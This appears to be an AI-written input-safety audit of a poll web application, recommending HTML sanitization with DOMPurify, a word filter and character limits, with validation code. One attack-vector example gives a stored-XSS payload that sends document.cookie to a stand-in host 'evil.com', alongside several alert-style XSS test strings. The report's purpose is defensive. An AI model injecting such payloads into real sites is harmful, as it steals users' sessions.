# 🔒 Input Safety & Validation Audit Report

## Executive Summary

**Current Status:** ⚠️ MODERATE RISK  
**XSS Risk:** 🔴 HIGH (No sanitization)  
**Content Safety:** 🟡 MEDIUM (No profanity filter)  
**Validation:** 🟢 GOOD (Length limits exist)

---

## 1️⃣ Input Validation Audit

### ✅ What's Already Protected

```javascript
// Backend validation (Joi)
question: 10-200 characters, trimmed
options: 1-100 characters each, 2-10 items

// Frontend validation
maxLength={200} on question input
maxLength={100} on option inputs
```

**Good practices already in place:**
- ✅ Length limits prevent database bloat
- ✅ Trim whitespace
- ✅ Minimum length prevents empty submissions
- ✅ Client + server validation (defense in depth)

### 🔴 Critical Gaps Found

#### Issue 1: No HTML/Script Sanitization
```javascript
// Current: User can submit
question: "<script>alert('XSS')</script>"
question: "<img src=x onerror=alert(1)>"
question: "<iframe src='evil.com'></iframe>"

// These are stored AS-IS in database
// Then rendered in React without escaping
```

**Risk Level:** 🔴 HIGH  
**Impact:** Stored XSS attack possible

#### Issue 2: No Special Character Restrictions
```javascript
// Current: Allows
question: "💩💩💩💩💩💩💩💩💩💩" (emoji spam)
question: "​​​​​​​​​​​​" (invisible unicode)
question: "SELECT * FROM users" (SQL-like text, harmless but confusing)
```

**Risk Level:** 🟡 MEDIUM  
**Impact:** Poor UX, potential abuse

#### Issue 3: No Newline/Formatting Control
```javascript
// Current: Allows
question: "Line1\n\n\n\n\n\n\n\nLine2" (excessive newlines)
```

**Risk Level:** 🟢 LOW  
**Impact:** UI breaking

---

## 2️⃣ Content Safety Audit

### Current State: No Profanity Filtering

**Risks:**
- Users can create polls with offensive content
- No moderation = brand risk
- Viral abuse potential

**Recommendation:** Add basic profanity filter (lightweight)

### Suggested Approach: Simple Blocked Words List

```javascript
// Simple, no external API needed
const blockedWords = [
  'badword1', 'badword2', // Add your list
  // Keep list small (10-20 words) for MVP
];

function containsBlockedWord(text) {
  const lower = text.toLowerCase();
  return blockedWords.some(word => lower.includes(word));
}
```

**Pros:**
- ✅ No external API cost
- ✅ Fast (milliseconds)
- ✅ Easy to maintain

**Cons:**
- ⚠️ Easy to bypass (l33t speak: "b@dword")
- ⚠️ False positives (Scunthorpe problem)

**Verdict:** Good enough for MVP, not for scale

---

## 3️⃣ Security Risk Assessment

### 🔴 HIGH RISK: XSS via Poll Question

**Attack Vector:**
```javascript
// Attacker creates poll:
POST /api/polls
{
  "question": "<img src=x onerror='fetch(\"evil.com?cookie=\"+document.cookie)'>",
  "options": ["A", "B"]
}

// Victim opens poll link
// Script executes in victim's browser
// Cookies/session stolen
```

**Why it works:**
1. Backend stores HTML as-is (no sanitization)
2. Frontend renders with React (escapes by default, BUT...)
3. If you ever use `dangerouslySetInnerHTML` → XSS

**Current Code Check:**
```jsx
// In PollRoom.jsx
<h1>{poll.question}</h1>  // ✅ Safe (React escapes)

// But if you later do:
<div dangerouslySetInnerHTML={{__html: poll.question}} />  // 🔴 XSS!
```

**Verdict:** Currently safe due to React auto-escaping, but risky if code changes.

### 🟡 MEDIUM RISK: Stored Script Injection

**Attack Vector:**
```javascript
// Attacker stores malicious data
question: "<script>alert(1)</script>"

// Data stored in MongoDB
// If admin panel renders without escaping → XSS
```

**Mitigation:** Sanitize on input, not output

### 🟢 LOW RISK: HTML Rendering Issues

React auto-escapes, so HTML tags display as text:
```
User enters: <b>Bold</b>
Displays as: <b>Bold</b> (not bold)
```

This is actually good for security!

---

## 4️⃣ Minimal Safe Improvements

### Priority 1: Add HTML Sanitization (5 min)

**Install:**
```bash
npm install dompurify isomorphic-dompurify
```

**Backend Update:**
```javascript
// backend/src/middleware/validation.js
import DOMPurify from 'isomorphic-dompurify';

export const createPollSchema = Joi.object({
  question: Joi.string()
    .min(10)
    .max(200)
    .trim()
    .custom((value, helpers) => {
      // Strip all HTML tags
      const clean = DOMPurify.sanitize(value, { ALLOWED_TAGS: [] });
      if (clean !== value) {
        return helpers.error('string.noHtml');
      }
      return clean;
    })
    .required()
    .messages({
      'string.noHtml': 'HTML tags are not allowed',
      'string.min': 'Question must be at least 10 characters',
      'string.max': 'Question cannot exceed 200 characters'
    }),
  
  options: Joi.array()
    .items(
      Joi.string()
        .min(1)
        .max(100)
        .trim()
        .custom((value, helpers) => {
          const clean = DOMPurify.sanitize(value, { ALLOWED_TAGS: [] });
          if (clean !== value) {
            return helpers.error('string.noHtml');
          }
          return clean;
        })
    )
    .min(2)
    .max(10)
    .messages({
      'string.noHtml': 'HTML tags are not allowed'
    })
});
```

**Impact:** Blocks all XSS attempts

---

### Priority 2: Add Basic Profanity Filter (10 min)

**Create utility:**
```javascript
// backend/src/utils/contentFilter.js
const blockedWords = [
  // Add your blocked words here
  // Keep list small for MVP (10-20 words)
  'spam', 'scam', 'hack'
];

export const containsProfanity = (text) => {
  const lower = text.toLowerCase()
    .replace(/[^a-z0-9\s]/g, ''); // Remove special chars
  
  return blockedWords.some(word => {
    const regex = new RegExp(`\\b${word}\\b`, 'i');
    return regex.test(lower);
  });
};

export const checkContent = (text) => {
  if (containsProfanity(text)) {
    return {
      safe: false,
      reason: 'Content contains inappropriate language'
    };
  }
  return { safe: true };
};
```

**Update validation:**
```javascript
// In validation.js
import { checkContent } from '../utils/contentFilter.js';

.custom((value, helpers) => {
  const check = checkContent(value);
  if (!check.safe) {
    return helpers.error('string.inappropriate');
  }
  return value;
})
.messages({
  'string.inappropriate': 'Content contains inappropriate language'
})
```

**Impact:** Blocks obvious profanity

---

### Priority 3: Add Character Type Restrictions (5 min)

**Prevent invisible characters and excessive emojis:**
```javascript
// In validation.js
.custom((value, helpers) => {
  // Check for invisible characters
  if (/[\u200B-\u200D\uFEFF]/.test(value)) {
    return helpers.error('string.invisibleChars');
  }
  
  // Limit emoji count (max 5)
  const emojiCount = (value.match(/[\u{1F600}-\u{1F64F}]/gu) || []).length;
  if (emojiCount > 5) {
    return helpers.error('string.tooManyEmojis');
  }
  
  // Require at least 50% alphanumeric
  const alphanumeric = value.replace(/[^a-zA-Z0-9]/g, '').length;
  if (alphanumeric < value.length * 0.5) {
    return helpers.error('string.notEnoughText');
  }
  
  return value;
})
.messages({
  'string.invisibleChars': 'Invisible characters not allowed',
  'string.tooManyEmojis': 'Too many emojis (max 5)',
  'string.notEnoughText': 'Question must contain actual text'
})
```

**Impact:** Prevents spam/abuse patterns

---

### Priority 4: Add Newline Limits (2 min)

```javascript
.custom((value, helpers) => {
  // Max 2 consecutive newlines
  if (/\n{3,}/.test(value)) {
    return helpers.error('string.tooManyNewlines');
  }
  return value.replace(/\n{2,}/g, '\n\n'); // Normalize
})
.messages({
  'string.tooManyNewlines': 'Too many line breaks'
})
```

---

## 📊 Risk Comparison

| Issue | Before | After Fixes | Time |
|-------|--------|-------------|------|
| XSS Attack | 🔴 HIGH | 🟢 LOW | 5 min |
| Profanity | 🟡 MEDIUM | 🟢 LOW | 10 min |
| Emoji Spam | 🟡 MEDIUM | 🟢 LOW | 5 min |
| Invisible Chars | 🟡 MEDIUM | 🟢 LOW | 2 min |

**Total Implementation Time: 22 minutes**

---

## 🎯 Recommended Implementation Order

### Phase 1: Critical (Do Now)
1. ✅ Add HTML sanitization (Priority 1)
   - Blocks XSS attacks
   - 5 minutes

### Phase 2: Important (Before Public Launch)
2. ✅ Add profanity filter (Priority 2)
   - Prevents brand damage
   - 10 minutes

### Phase 3: Nice to Have (Post-Launch)
3. ✅ Add character restrictions (Priority 3)
   - Improves UX
   - 5 minutes

4. ✅ Add newline limits (Priority 4)
   - Prevents UI breaking
   - 2 minutes

---

## 🔧 Complete Implementation

Here's the complete updated validation file:

```javascript
// backend/src/middleware/validation.js
import Joi from 'joi';
import DOMPurify from 'isomorphic-dompurify';

// Content filter
const blockedWords = ['spam', 'scam']; // Add your list

const containsProfanity = (text) => {
  const lower = text.toLowerCase().replace(/[^a-z0-9\s]/g, '');
  return blockedWords.some(word => new RegExp(`\\b${word}\\b`, 'i').test(lower));
};

// Custom validator
const safeTextValidator = (value, helpers) => {
  // 1. Strip HTML
  const clean = DOMPurify.sanitize(value, { ALLOWED_TAGS: [] });
  if (clean !== value) {
    return helpers.error('string.noHtml');
  }
  
  // 2. Check profanity
  if (containsProfanity(clean)) {
    return helpers.error('string.inappropriate');
  }
  
  // 3. Check invisible characters
  if (/[\u200B-\u200D\uFEFF]/.test(clean)) {
    return helpers.error('string.invisibleChars');
  }
  
  // 4. Limit emojis
  const emojiCount = (clean.match(/[\u{1F600}-\u{1F64F}]/gu) || []).length;
  if (emojiCount > 5) {
    return helpers.error('string.tooManyEmojis');
  }
  
  // 5. Require text content
  const alphanumeric = clean.replace(/[^a-zA-Z0-9]/g, '').length;
  if (alphanumeric < clean.length * 0.3) {
    return helpers.error('string.notEnoughText');
  }
  
  // 6. Normalize newlines
  return clean.replace(/\n{3,}/g, '\n\n');
};

export const createPollSchema = Joi.object({
  question: Joi.string()
    .min(10)
    .max(200)
    .trim()
    .custom(safeTextValidator)
    .required()
    .messages({
      'string.noHtml': 'HTML tags are not allowed',
      'string.inappropriate': 'Content contains inappropriate language',
      'string.invisibleChars': 'Invisible characters not allowed',
      'string.tooManyEmojis': 'Too many emojis (max 5)',
      'string.notEnoughText': 'Question must contain actual text',
      'string.min': 'Question must be at least 10 characters',
      'string.max': 'Question cannot exceed 200 characters'
    }),
  
  options: Joi.array()
    .items(
      Joi.string()
        .min(1)
        .max(100)
        .trim()
        .custom(safeTextValidator)
    )
    .min(2)
    .max(10)
    .required()
    .messages({
      'string.noHtml': 'HTML tags are not allowed in options',
      'string.inappropriate': 'Option contains inappropriate language',
      'array.min': 'Poll must have at least 2 options',
      'array.max': 'Poll cannot have more than 10 options'
    })
});
```

---

## ✅ Testing Checklist

After implementing fixes, test:

```javascript
// Should BLOCK:
❌ "<script>alert(1)</script>"
❌ "<img src=x onerror=alert(1)>"
❌ "spam spam spam"
❌ "💩💩💩💩💩💩💩💩"
❌ "​​​​​​" (invisible chars)
❌ "\n\n\n\n\n\n\n\n"

// Should ALLOW:
✅ "What's your favorite color? 🎨"
✅ "Which framework is best?"
✅ "Coffee ☕ or Tea 🍵?"
```

---

## 📝 Summary

### Current Risks
- 🔴 XSS via HTML injection
- 🟡 Profanity/abuse
- 🟡 Emoji/character spam

### After Fixes
- 🟢 XSS blocked
- 🟢 Profanity filtered
- 🟢 Spam prevented

### Implementation Effort
- **Time:** 22 minutes
- **Complexity:** Low
- **Dependencies:** 1 package (dompurify)

### Recommendation
**Implement Priority 1 (HTML sanitization) immediately before any public launch.**  
Other priorities can be added incrementally.

---

## 🚀 Production Readiness

| Security Aspect | Before | After | Status |
|----------------|--------|-------|--------|
| XSS Protection | ❌ | ✅ | READY |
| Content Filter | ❌ | ✅ | READY |
| Input Validation | ✅ | ✅ | READY |
| Length Limits | ✅ | ✅ | READY |

**Verdict: PRODUCTION READY after implementing Priority 1** ✅
